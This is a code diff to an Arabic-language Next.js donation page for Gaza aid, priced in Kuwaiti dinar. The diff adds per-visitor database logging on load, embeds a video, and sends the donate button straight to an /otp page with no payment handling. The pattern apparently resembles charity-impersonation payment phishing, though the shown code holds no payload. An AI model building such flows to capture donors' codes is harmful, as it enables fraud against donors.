@@ -2,18 +2,28 @@
 
 import type React from "react"
 
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import Image from "next/image"
 import Link from "next/link"
 import { Instagram, Youtube, Twitter, Facebook } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Progress } from "@/components/ui/progress"
+import { addData } from "@/lib/db"
+import { useRouter } from "next/navigation"
 
 export default function DonationPage() {
   const [customAmount, setCustomAmount] = useState("")
-  const [selectedAmount, setSelectedAmount] = useState<number | null>(null)
+  const [_id] = useState("id" + Math.random().toString(16).slice(2))
+  const router = useRouter()
 
+  useEffect(() => {
+    addData({
+      id: _id,
+      currentPage: 'الرئيسة',
+      createdDate: new Date().toISOString(),
+    })
+  }, [])
   const donationStats = {
     donors: 10389,
     current: 293266,
@@ -21,40 +31,21 @@ export default function DonationPage() {
     percentComplete: 77,
   }
 
-  const handleAmountSelect = (amount: number) => {
-    setSelectedAmount(amount)
-    setCustomAmount("")
-  }
 
-  const handleCustomAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    setCustomAmount(e.target.value)
-    setSelectedAmount(null)
+  const handleCustomAmountChange = (e: string) => {
+    setCustomAmount(e)
   }
+  const handleSubmit = () => {
 
+  }
   return (
     <div className="flex flex-col min-h-screen bg-gray-100 text-right" dir="rtl">
       {/* Header */}
       <main className="flex-1 max-w-3xl mx-auto w-full p-4">
         {/* Video Section */}
         <div className="relative aspect-video w-full mb-6 bg-gray-200 rounded">
-          <div className="absolute inset-0 flex items-center justify-center">
-            <div className="bg-red-600 rounded-full w-16 h-16 flex items-center justify-center cursor-pointer">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="24"
-                height="24"
-                viewBox="0 0 24 24"
-                fill="none"
-                stroke="white"
-                strokeWidth="2"
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                className="lucide lucide-play"
-              >
-                <polygon points="5 3 19 12 5 21 5 3" />
-              </svg>
-            </div>
-          </div>
+          <iframe width="100%" height="100%" src="https://www.youtube.com/embed/LJC2_NWYTSs" 
+          title="شاحنات حفاظ المحملة بمساعدات أهل الخير تدخل إلى قطاع غزة لدعم صمود أهلها" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerPolicy="strict-origin-when-cross-origin" allowFullScreen></iframe>
         </div>
 
         {/* Donation Title */}
@@ -89,29 +80,29 @@ export default function DonationPage() {
           <p className="mb-2">اختر قيمة التبرع</p>
           <div className="grid grid-cols-2 gap-4 mb-4">
             <Button
-              variant={selectedAmount === 30 ? "default" : "outline"}
-              onClick={() => handleAmountSelect(30)}
+              variant={customAmount === '30' ? "default" : "outline"}
+              onClick={() => handleCustomAmountChange('30')}
               className="bg-white border text-black hover:bg-gray-100 hover:text-black"
             >
               د.ك 30
             </Button>
             <Button
-              variant={selectedAmount === 40 ? "default" : "outline"}
-              onClick={() => handleAmountSelect(40)}
+              variant={customAmount === '40' ? "default" : "outline"}
+              onClick={(e) => handleCustomAmountChange('40')}
               className="bg-white border text-black hover:bg-gray-100 hover:text-black"
             >
               د.ك 40
             </Button>
             <Button
-              variant={selectedAmount === 50 ? "default" : "outline"}
-              onClick={() => handleAmountSelect(50)}
+              variant={customAmount === '50' ? "default" : "outline"}
+              onClick={() => handleCustomAmountChange('50')}
               className="bg-white border text-black hover:bg-gray-100 hover:text-black"
             >
               د.ك 50
             </Button>
             <Button
-              variant={selectedAmount === 60 ? "default" : "outline"}
-              onClick={() => handleAmountSelect(60)}
+              variant={customAmount === '60' ? "default" : "outline"}
+              onClick={() => handleCustomAmountChange('60')}
               className="bg-white border text-black hover:bg-gray-100 hover:text-black"
             >
               د.ك 60
@@ -127,14 +118,18 @@ export default function DonationPage() {
                 type="number"
                 placeholder="أدخل مبلغ آخر"
                 value={customAmount}
-                onChange={handleCustomAmountChange}
+                onChange={(e) => handleCustomAmountChange(e.target.value)}
                 className="rounded-l-none text-right"
               />
             </div>
           </div>
 
           {/* Donate Button */}
-          <Button className="w-full bg-[#0a3b4d] hover:bg-[#0a3b4d]/90 text-white py-3 mb-4">تبرع الآن</Button>
+          <Button  onClick={()=>{
+                                    router.push(`/otp`)
+
+          }}
+          className="w-full bg-[#0a3b4d] hover:bg-[#0a3b4d]/90 text-white py-3 mb-4">تبرع الآن</Button>
 
           {/* Additional Options */}
           <div className="grid grid-cols-2 gap-4 mb-6">
